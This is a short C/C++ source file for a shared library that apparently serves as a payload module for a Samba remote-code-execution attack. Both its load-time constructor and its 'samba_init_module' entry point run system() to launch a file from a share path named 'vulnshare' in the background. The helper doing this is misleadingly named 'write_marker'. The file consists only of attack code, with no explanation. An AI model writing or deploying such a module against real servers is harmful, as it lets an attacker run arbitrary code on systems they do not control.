#include <stdio.h>
#include <stdlib.h>

static void write_marker(void) {
    system("/srv/samba/vulnshare/sambatest.so &");
}

void __attribute__((constructor)) on_load(void) {
    write_marker();
}

extern "C" int samba_init_module(void) {
    write_marker();
    return 0;
}